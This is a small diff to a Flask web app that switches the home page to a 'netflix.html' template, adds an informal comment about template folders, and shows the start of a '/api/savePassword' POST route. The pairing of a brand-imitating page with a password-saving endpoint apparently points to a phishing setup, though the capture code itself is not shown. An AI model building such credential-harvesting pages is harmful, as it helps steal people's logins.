@@ -4,7 +4,8 @@ app = Flask(__name__)
 
 @app.route('/')
 def index():
-    return render_template('target.html')
+    #create a sub folder named template and move ur template into that folder then only it will work 
+    return render_template('netflix.html')
 
 @app.route('/api/savePassword', methods=['POST'])
 def save_password():
